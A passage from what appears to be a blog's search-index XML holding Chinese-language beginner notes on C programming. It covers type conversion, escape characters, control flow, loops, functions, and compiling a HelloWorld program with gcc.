class="line">&#123;</span><br><span class="line">    char c;</span><br><span class="line">    char d;</span><br><span class="line">    c = 1;</span><br><span class="line">    d = &#x27;1&#x27;;</span><br><span class="line">    if(c == d)&#123;</span><br><span class="line">        printf(&quot;相等\n&quot;); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        printf(&quot;不相等\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;c=%d\n&quot;,c);</span><br><span class="line">    printf(&quot;d=%d\n&quot;,d);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>字母大小写转换</p><ul><li>a+’a’-‘A’ 大写字母变成小写字母</li><li>a+’A’-‘a’ 小写字母变成大写字母</li></ul></li></ul><p>5 逃逸字符</p><p>字符</p><p>意义</p><p>字符</p><p>意义</p><p>\b</p><p>回退一格</p><p>\ “</p><p>双引号</p><p>\t</p><p>到下一个表格位</p><p>\ ‘</p><p>单引号</p><p>\n</p><p>换行</p><p>\ \</p><p>反斜杠本身</p><p>\r</p><p>回车</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;123\bA\n456&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6 自动类型转换</p><ul><li>当运算符的两边出现不一致的类型时，会自动转换成较大的类型</li><li>char –&gt; short –&gt; int –&gt; long –&gt; long long</li><li>int –&gt; float –&gt; double</li><li>short —– %hd</li><li>long —— %ld</li></ul><p>7 强制类型转换</p><ul><li>Example 01：</li><li>(int)10.2</li><li>(short)32</li><li>反例1：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%d\n&quot;,(short)32768);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>结果：-32768</li><li>反例2：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%d\n&quot;,(char)32768);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>结果：0</li></ul><p>注：<code>强制类型转换的优先级高于四则运算</code></p><h2 id="2-7-选择结构和条件判断"><a href="#2-7-选择结构和条件判断" class="headerlink" title="2.7 选择结构和条件判断"></a>2.7 选择结构和条件判断</h2><p>C 语言有两种选择语句：</p><p>（1）if 语句，用来实现两个分支的选择结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (表达式)</span><br><span class="line">    语句1</span><br><span class="line">else</span><br><span class="line">    语句2</span><br></pre></td></tr></table></figure><p>（2）switch 语句，用来实现多分支的选择结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">switch(表达式)</span><br><span class="line">&#123;</span><br><span class="line">case 常量1 ：语句1</span><br><span class="line">case 常量2 ：语句2</span><br><span class="line">        ...</span><br><span class="line">case 常量n ：语句n</span><br><span class="line">default: 语句n+1</span><br></pre></td></tr></table></figure><h2 id="2-8-循环结构"><a href="#2-8-循环结构" class="headerlink" title="2.8 循环结构"></a>2.8 循环结构</h2><p>（1）用 while 语句实现循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while(表达式)</span><br><span class="line">    语句</span><br></pre></td></tr></table></figure><p>（2）用 do…while 语句实现循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">do</span><br><span class="line">    语句</span><br><span class="line">while(表达式);</span><br></pre></td></tr></table></figure><p>（3）用 for 语句实现循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for(表达式1;表达式2;表达式3)</span><br><span class="line">    语句</span><br></pre></td></tr></table></figure><ul><li>改变循环执行的状态</li></ul><p>（1）用 break 语句提前终止循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般形式：break;</span><br></pre></td></tr></table></figure><p>注意：break 语句还可以用来从循环体内跳出循环体，即提前结束循环，接着执行循环下面的语句。break 语句只能用于循环语句和 switch 语句之中，而不能单独使用。</p><p>（2）用 continue 语句提前结束本次循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般形式：continue;</span><br></pre></td></tr></table></figure><p>注：作用为结束本次循环，即跳过循环体中下面尚未执行的语句，转到循环体结束点之前，然后进行下一次是否执行循环的判定。</p><blockquote><p>bool</p></blockquote><p><code>#include &lt;stdbool.h&gt;</code> 之后就可以使用bool和true、false</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdbool.h&gt; </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    bool b = 6&gt;5;</span><br><span class="line">    printf(&quot;%d&quot;,b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>随机数</p></blockquote><ul><li>rand()</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">//主函数 </span><br><span class="line">int main()&#123;</span><br><span class="line">    srand(time(0));</span><br><span class="line">    int a = rand();</span><br><span class="line">    printf(&quot;%d\n&quot;,a);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>x%n 的结果是[0,n-1]的一个整数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%d\n&quot;,a%100);</span><br></pre></td></tr></table></figure><ul><li>Example：<a href="https://wugenqiang.github.io/CS-Notes/#/C/C-Notes?id=_004-%E7%8C%9C%E6%95%B0%E6%B8%B8%E6%88%8F">猜数游戏</a></li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char c = 255;</span><br><span class="line">    int i = 255;</span><br><span class="line">    printf(&quot;c=%d,i=%d\n&quot;,c,i);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑运算</p><ol><li>逻辑非： ！</li><li>逻辑与： &amp;&amp;</li><li>逻辑或：</li></ol><h2 id="2-9-函数"><a href="#2-9-函数" class="headerlink" title="2.9 函数"></a>2.9 函数</h2><ul><li>函数是一块代码，接收零个或多个参数，做一件事情，并返回零个或一个值</li><li>函数原型，以分号结尾，即声明</li><li>Example 01：判断素数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int isPrime(int i)&#123;</span><br><span class="line">    int result = 1;</span><br><span class="line">    int k;</span><br><span class="line">    for(k=2;k&lt;i-1;k++)&#123;</span><br><span class="line">        if(i%k == 0)&#123;</span><br><span class="line">            result = 0;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：求和函数 &#x3D;&#x3D;&gt; 求1到10、20到30和36到45的三个和</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void sum(int begin,int end)&#123;</span><br><span class="line">  int i;</span><br><span class="line">  int sum = 0;</span><br><span class="line">  for(i=begin;i&lt;=end;i++)&#123;</span><br><span class="line">        sum += i;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;%d 到 %d 的和是 %d\n&quot;,begin,end,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>C 语言在调用函数时，永远只能传值给函数</li></ul><p>局部变量</p><ul><li>也叫：本地变量 &#x3D;&#x3D;&gt; 定义在函数内部的变量</li><li>生存期和作用域 &#x3D;&#x3D;&gt; 大括号内，即代码块</li></ul><p>全局变量</p><ul><li>定义在函数体外面</li></ul><p>{cat_tips_A}代码复制是代码不良的表现！{&#x2F;cat_tips_A}</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 基本语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记第一章 编程基础</title>
      <link href="/35.html"/>
      <url>/35.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-1-什么是编程语言"><a href="#1-1-什么是编程语言" class="headerlink" title="1.1 什么是编程语言"></a>1.1 什么是编程语言</h2><p>我们通过 “语言” 来控制计算机，让计算机为我们做事情，这样的语言就叫做编程语言（Programming Language）。</p><p>编程语言有很多种，常用的有 C 语言、C++、Java、C#、Python、PHP、JavaScript、Go 语言、Objective-C、Swift、汇编语言等，每种语言都有自己擅长的方面，例如：</p><p>编程语言</p><p>主要用途</p><p>C&#x2F;C++</p><p>C++ 是在 C 语言的基础上发展起来的，C++ 包含了 C 语言的所有内容，C 语言是 C++ 的一个部分，它们往往混合在一起使用，所以统称为 C&#x2F;C++。C&#x2F;C++ 主要用于 PC 软件开发、Linux 开发、游戏开发、单片机和嵌入式系统。</p><p>Java</p><p>Java 是一门通用型的语言，可以用于网站后台开发、Android 开发、PC 软件开发，近年来又涉足了大数据领域（归功于 Hadoop 框架的流行）。</p><p>C#</p><p>C# 是微软开发的用来对抗 Java 的一门语言，实现机制和 Java 类似，不过 C# 显然失败了，目前主要用于 Windows 平台的软件开发，以及少量的网站后台开发。</p><p>Python</p><p>Python 也是一门通用型的语言，主要用于系统运维、网站后台开发、数据分析、人工智能、云计算等领域，近年来势头强劲，增长非常快。</p><p>PHP</p><p>PHP 是一门专用型的语言，主要用来开发网站后台程序。</p><p>JavaScript</p><p>JavaScript 最初只能用于网站前端开发，而且是前端开发的唯一语言，没有可替代性。近年来由于 Node.js 的流行，JavaScript 在网站后台开发中也占有了一席之地，并且在迅速增长。</p><p>Go 语言</p><p>Go 语言是 2009 年由 Google 发布的一款编程语言，成长非常迅速，在国内外已经有大量的应用。Go 语言主要用于服务器端的编程，对 C&#x2F;C++、Java 都形成了不小的挑战。</p><p>Objective-C Swift</p><p>Objective-C 和 Swift 都只能用于苹果产品的开发，包括 Mac、MacBook、iPhone、iPad、iWatch 等。</p><p>汇编语言</p><p>汇编语言是计算机发展初期的一门语言，它的执行效率非常高，但是开发效率非常低，所以在常见的应用程序开发中不会使用汇编语言，只有在对效率和实时性要求极高的关键模块才会考虑汇编语言，例如操作系统内核、驱动、仪器仪表、工业控制等。</p><p>可以将不同的编程语言比喻成各国语言，为了表达同一个意思，可能使用不同的语句。例如，表达“世界你好”的意思：</p><ul><li>汉语：世界你好；</li><li>英语：Hello World</li><li>法语：Bonjour tout le monde</li></ul><p>在编程语言中，同样的操作也可能使用不同的语句。例如，在屏幕上显示“Hello World”：</p><ul><li>C 语言：puts(“Hello World”);</li><li>PHP：echo “Hello World”;</li><li>Java：System.out.println(“Hello World”);</li></ul><h2 id="1-2-多久能学会编程"><a href="#1-2-多久能学会编程" class="headerlink" title="1.2 多久能学会编程"></a>1.2 多久能学会编程</h2><p>这是一个没有答案的问题。每个人投入的时间、学习效率和基础都不一样。如果你每天都拿出大把的时间来学习，那么很快就能学会。程序员被戏称为”码农“，意思是写代码的农民，要想成为一个合格的农民，必须要脚踏实地辛苦耕耘。</p><p>在学习其他语言之前，个人建议先学习 C 语言，触类旁通，讲究的是思考问题的方式和思考的内容，后期会学习算法和数据结构，当然会有 C 版本、C++ 版本以及 Java 版本等等，你可能都会涉及到，但是不一定全都要看，前提是算法思想懂了！</p><p>好的，现在开始投入 C 语言的怀抱中来，推荐 IDE 编辑器：<a href="https://sourceforge.net/projects/orwelldevcpp/?source=directory">Dev-C++</a>，当然你有其他更好的选择也可以咯！</p><h2 id="1-3-使用-C-语言的-7-个步骤"><a href="#1-3-使用-C-语言的-7-个步骤" class="headerlink" title="1.3 使用 C 语言的 7 个步骤"></a>1.3 使用 C 语言的 7 个步骤</h2><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423180054.png" alt="image-20200423180052574" title="image-20200423180052574"></p><h2 id="1-4-C-语言程序框架"><a href="#1-4-C-语言程序框架" class="headerlink" title="1.4 C 语言程序框架"></a>1.4 C 语言程序框架</h2><p>程序框架如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个 C 语言程序的结构有以下特点：</p><ol><li>一个程序由一个或者多个源程序文件组成</li><li>在一个源程序文件中包括3部分：预处理指令、全局声明、函数定义</li><li>函数是 C 语言程序的主要组成部分</li><li>一个函数包括两个部分：函数首部和函数体，函数体又包括声明部分和执行部分</li><li>程序总是从 main 函数开始之执行的</li><li>程序中对计算机的操作是由函数中的 C 语句完成的</li><li>在每个数据声明和语句的最后必须有一个分号</li><li>C 语言本身不提供输入输出语句</li><li>程序应当包含注释</li></ol><h2 id="1-5-输出-HelloWorld"><a href="#1-5-输出-HelloWorld" class="headerlink" title="1.5 输出 HelloWorld"></a>1.5 输出 HelloWorld</h2><p>人生第一个代码：HelloWorld，很经典的哟！哈哈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123; //&lt;---函数体的开始</span><br><span class="line">    // 输出 HelloWorld!  &lt;----这是注释</span><br><span class="line">    printf(&quot;HelloWorld!\n&quot;);//&lt;---函数调用语句</span><br><span class="line">    return 0;//&lt;---返回语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="命令行编辑、编译、运行程序"><a href="#命令行编辑、编译、运行程序" class="headerlink" title="命令行编辑、编译、运行程序"></a>命令行编辑、编译、运行程序</h3><h4 id="Example-01"><a href="#Example-01" class="headerlink" title="Example 01"></a>Example 01</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br><span class="line">gcc hello.c</span><br><span class="line">ls -l</span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure><h4 id="Example-02：-默认在64位电脑上执行"><a href="#Example-02：-默认在64位电脑上执行" class="headerlink" title="Example 02：(默认在64位电脑上执行)"></a>Example 02：(默认在64位电脑上执行)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c -o hello</span><br><span class="line">./hello</span><br></pre></td></tr></table></figure><h4 id="Example-03：-m32-表示在32位电脑上执行"><a href="#Example-03：-m32-表示在32位电脑上执行" class="headerlink" title="Example 03：(-m32 表示在32位电脑上执行)"></a>Example 03：(-m32 表示在32位电脑上执行)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c -o hello -m32</span><br><span class="line">./hello</span><br></pre></td></tr></table></figure><h2 id="1-6-不能缺席的注释先生"><a href="#1-6-不能缺席的注释先生" class="headerlink" title="1.6 不能缺席的注释先生"></a>1.6 不能缺席的注释先生</h2><p>注释内容可以用英文或者汉字</p><h3 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h3><p>&#x2F;&#x2F;注释内容，以&#x2F;&#x2F;的单行注释，以换行符结束</p><h3 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h3><p>&#x2F; <em>注释内容</em> &#x2F;， 这种注释可以跨越多行</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 编程基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
